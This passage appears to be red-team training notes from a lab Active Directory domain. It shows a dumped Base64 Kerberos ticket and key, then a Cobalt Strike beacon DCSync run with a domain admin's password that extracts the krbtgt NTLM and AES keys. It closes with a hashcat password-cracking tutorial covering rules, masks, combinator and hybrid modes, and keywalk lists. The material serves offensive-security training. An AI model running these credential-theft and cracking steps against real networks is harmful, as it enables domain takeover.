    Base64(key)              :  LTovMHNCu7EWKfVqxkfB9f6crVX/vHusZ7PZ1QJH+IY=
    Base64EncodedTicket   :

doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRT0D6Q2mZUmHG6vNmFmTo2iyAeCXjkDYSBR8X8Lr/nnRMqHtJU9Y7DYE4WIgDtHpmpOVixcdl+Je2FKsHoDCAjuwMio7ghbRKvQIEBKJp165RWwBgeBRdtRl9pZdZUBrGEQ8dztaRUn/piP2c2uMbC7KJDj8LLH4XW0JCJKuNo7TLFIgvPVTVMnZrjI1nMIjgvYz1Xbhr7PUE//SAhXI5e1cO2QUKEWPogeDyX4EdPWZU2FJgvCNY7K2VulcMtJUkGFc3egNXlrKYakaD9qo5fXOig3QNoICa2aMa5/CtfqGIcpX1M81UoM827NYOC7PHNHN6x68eFfN2TFQfY8dODBcoXzXlNMCuPFDsJpkC6/cdK2o1I2xf22sy5ljxkUWCjHrFDvyTnlgdhn0mxV9F32aRQixU9vGltvOrZl31/2O+0NCONnNNgqW3g8+OBUe8mqd0iBgvNXy1SE31kU+87cyMkLzGsIWbcJRLDlx2KwTWLcD5ZEmwnVUTDnr/MTdv3ir6JRrNZSNP0TFdZuq2KGVBOAqmIwBf4tSQJqWdf3jj7ubQ8ZwsuGHB9sYq1CPo2V69tELa5exXVupNS2Mc6SD/yTkk4FmXOV1I8O2AU5gJXRUWGIsUYZ1Je0tLKfLsQeWwe72pHhVKgNwZqxl3mMsjXqcC6cz5T3oivd6lbGQBOERZK4286T/mZGEwPA03lnLTzleQGduSga0F9tPRncYt9kRUZVAvn5DgzGNv8GmMus2bKg9uoc9N7RPQNPtS77F442z9/1nAx1PGyal66w5idgvk8Ymkdzv66zfVWXf1S0UbBZzzHEykcrX1VmHzvTzqDtSLcXUZ5W/0j7KfLnb5kMFCxLTaieu7sE2Eb6n/rwOkEWG5sKkZkss4lk39w0pn7bowQhF/ZKesGIoLcpmgoL0j6qRmYnDQWgTT79qPlENyirZtaWSBGvc0Ep3mq8mEfor0n7/AkRojpQ3XjHwKUmguiShnBzSWYvNTuHtShB+5gIj1XEg2TCRHlgqGeYmaRuRcQ3HwvqIb4XXAhRiC6x8tws4zUtEAR5Monj01s9bP6jBEKQJjoS2wzJmv0Gbhz2nNraqi4OMQciFjB5msRHVH9bDY9kEFdS2ehmrBPuIWv9ojq1ejiOwV6oZT8YuztWv/msPK6/ZKgopD6+ywyi5wouJEPd5fAHdGlcmBKnYn/CxpfUNjLJsXQBmvqtlXvmbuU1u8WT8auqhuF3sAJt5HiKR05o8uf8A7FIYsIPKmTyehGZTS9zuiKp3kAhIgXFsD5Lm6AWssc1FbwxmVKTa1dY+cyWCwXNiLIcWHjAEGtuxZah2hgSmkntXBrM8Vc4Y7vcTltmLI99EwCGPUiyr50KYrqHc2DEcsvvxGTEOFOTQ7hI2dElY2CvyrA7RhuIcUtl+xvF2SVEWr4pQz1HU5vQyLzmKFZtBbwGi0tMr8c6totBU7kKA1ZeYSqcgLgo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgLTovMHNCu7EWKfVqxkfB9f6crVX/vHusZ7PZ1QJH+IahExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6MHAwUAQOEAAKURGA8yMDI1MTExODIxNTg1MFqmERgPMjAyNTExMTkwNzU4NTBapxEYDzIwMjUxMTI1MjE1ODUwWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=

```

### DCSync

The [Directory Replication Service (MS-DRSR) protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) is used to synchronise and replicate Active Directory data between domain controllers. &#x20;

DCSync is a technique which leverages this protocol to extract username and credential data from a DC.

{% hint style="info" %}
This requires [GetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) which is usually only available to domain admins. &#x20;

The technique is included here for completeness, and it will be useful later on.
{% endhint %}

#### Performing DCSync via Beacon

1. **Impersonate `nlamb`:**

```
beacon> make_token DEV\nlamb F3rrari
[11/17 01:01:53] beacon> make_token DEV\nlamb F3rrari
[11/17 01:01:53] [*] Tasked beacon to create a token for DEV\nlamb
[11/17 01:01:54] [+] host called home, sent: 35 bytes
[11/17 01:01:55] [+] Impersonated DEV\nlamb (netonly
```

2. Perform DCSync w/ impersonated `nlamb`:

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[11/17 01:02:26] [*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[11/17 01:02:30] [+] host called home, sent: 314695 bytes
[11/17 01:02:40] [+] job registered with id 17
[11/17 01:02:40] [+] [job 17] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 8/15/2022 4:01:04 PM
Object Security ID   : S-1-5-21-569305411-121244042-2357301523-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```

Here we have extracted the NTLM and AES keys for the krbtgt account using _nlamb_ (a domain admin).

## Password Cracking

{% hint style="info" %}
* `-a 0` specifies the wordlist attack mode.
* `-m 1000` specifies that the hash is NTLM.
* `ntlm.txt` is a text file containing the NTLM hash to crack.
* `rockyou.txt` is the wordlist.
{% endhint %}

```
hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt

58a478135a93ac3bf058a5ea0e8fdb71:Password123
```

### Extending Wordlists with Rules

Rules can allow for the extension of "base" words in a wordlist that are common habits for users.

Such manipulation can include toggling character cases and character replacement.

* We can also append characters!

```
hashcat.exe -a 0 -m 1000 ntlm.txt rockyou.txt -r rules\add-year.rule

acbfc03df96e93cf7294a01a6abbda33:Summer2020
```

* `-r rules\add-year.rule` is our custom rule file

**The rockyou list does not contain Summer2020, but it does contain the base word, Summer:**

```
PS C:\> Select-String -Pattern "^Summer2020$" -Path rockyou.txt -CaseSensitive
PS C:\> Select-String -Pattern "^Summer$" -Path rockyou.txt -CaseSensitive

rockyou.txt:16573:Summer
```

### Masks

A brute-force is an attempt to crack using all combinations in a given keyspace.

A Mask attack is an evolution of the bruteforce and allows for us to be more selective over the keyspace in certain conditions.

A Mask allows us to attack a password pattern in a much more efficient way.

Using the full keyspace on the first character, we can limit ourselves to uppercase only and likewise with other positions.

```
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

64f12cddaa88057e06a81b54e73b949b:Password1
```

Where:

* `-a 3` specifies the mask attack.
* `?u?l?l?l?l?l?l?l?d` is the mask.

**`hashcat --help` will show the charsets and are as follows:**

```
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff
```

**You can combine these charsets within your mask for even more flexibility. It's also common for password to end with a special (such as `!`) rather than a number, but we can specify both in a mask:**

```
hashcat.exe -a 3 -m 1000 ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1

fbdcd5041c96ddbd82224270b57f11fc:Password!
```

**Where:**

* `-1 ?d?s` defines a custom charset (digits and specials).
* `?u?l?l?l?l?l?l?l?1` is the mask, where `?1` is the custom charset.

### Mask Length & Mask Files

By default, this mask attack sets a static password length - `?u?l?l?l?l?l?l?l?1` defines 9 characters, which means we can only crack a 9-character password. To crack passwords of different lengths, we have to manually adjust the mask accordingly.

**Hashcat mask files make this process a lot easier for custom masks that you use often:**

```
PS C:\> cat example.hcmask
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
```

```
hashcat.exe -a 3 -m 1000 ntlm.txt example.hcmask
hashcat (v6.1.1) starting...

Status...........: Exhausted
Guess.Mask.......: ?u?l?l?l?l?1 [6]

[...snip...]

Guess.Mask.......: ?u?l?l?l?l?l?1 [7]

820be3700dfcfc49e6eb6ef88d765d01:Chimney!
```

**Masks can even have static strings defined, such as a company name or other keyword you suspect are being used in passwords:**

```
ZeroPointSecurity?d
ZeroPointSecurity?d?d
ZeroPointSecurity?d?d?d
ZeroPointSecurity?d?d?d?d
```

```
hashcat.exe -a 3 -m 1000 ntlm.txt example2.hcmask

f63ebb17e157149b6dfde5d0cc32803c:ZeroPointSecurity1234
```

### Combinator

The combinator attack combines the entries from two dictionaries into single-word candidates. Take the following lists as an example:

```
PS C:\> cat list1.txt
purple

PS C:\> cat list2.txt
monkey
dishwasher
```

The combinator will produce "purplemonkey" and "purpledishwasher" as candidates.  You can also apply a rule to each word on the left- or right-hand side using the options `-j` and `-k`.  For instance, `-j $-` and `-k $!` would produce `purple-monkey!`.

```
hashcat.exe -a 1 -m 1000 ntlm.txt list1.txt list2.txt -j $- -k $!

ef81b5ffcbb0d030874022e8fb7e4229:purple-monkey!
```

&#x20; If running in Linux, shells (`sh`, `bash`, `zsh`, `fish`, etc) will have their own behaviour when the $ character is used on the command line.  They may need to be quoted.

### Hybrid

Hashcat modes 6 and 7 are hybrid's based on wordlists, masks and the combinator.  You specify both a wordlist and mask on the command line, and the mask is appended or prepended to the words within the list. For example, your dictionary contains the word `Password`, then `-a 6 [...] list.txt ?d?d?d?d` will produce `Password0000` to `Password9999`.

```
hashcat.exe -a 6 -m 1000 ntlm.txt list.txt ?d?d?d?d

be4c5fb0b163f3cc57bd390cdc495bb9:Password5555
```

**Where:**

* `-a 6` specifies the hybrid wordlist + mask mode.
* `?d?d?d?d` is the mask.

**The hybrid mask + wordlist mode (`-a 7`) is practically identical, where the mask comes first:**

```
hashcat.exe -a 7 -m 1000 ntlm.txt ?d?d?d?d list.txt

28a3b8f54a6661f15007fca23beccc9c:5555Password
```

### kwprocessor

There are a number of external utilities that are separate from the main hashcat application. Here we'll review one called [kwprocessor](https://github.com/hashcat/kwprocessor).  This is a utility for generating key-walk passwords, which are based on adjacent keys such as `qwerty`, `1q2w3e4r`, `6yHnMjU7` and so on. To humans, these can look rather random and secure (uppers, lowers, numbers & specials), but in reality they're easy to generate programmatically.

**kwprocessor has three main components:**

1. **Base characters - the alphabet of the target language.**
2. **Keymaps - the keyboard layout.**
3. **Routes - the directions to walk in.**

**There are several examples provided in the basechars, keymaps and routes directory in the kwprocessor download:**

```
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o keywalk.txt

PS C:\> Select-String -Pattern "^qwerty$" -Path keywalk.txt -CaseSensitive

D:\Tools\keywalk.txt:759:qwerty
D:\Tools\keywalk.txt:926:qwerty
D:\Tools\keywalk.txt:931:qwerty
D:\Tools\keywalk.txt:943:qwerty
D:\Tools\keywalk.txt:946:qwerty
```

Some candidates will get generated multiple times, so you'll want to de-dup the list before using it for maximum efficiency.  This wordlist can then be used like any other dictionary in hashcat.

&#x20; Use `kwp64.exe --help` to see customisable options such as toggling the shift key.
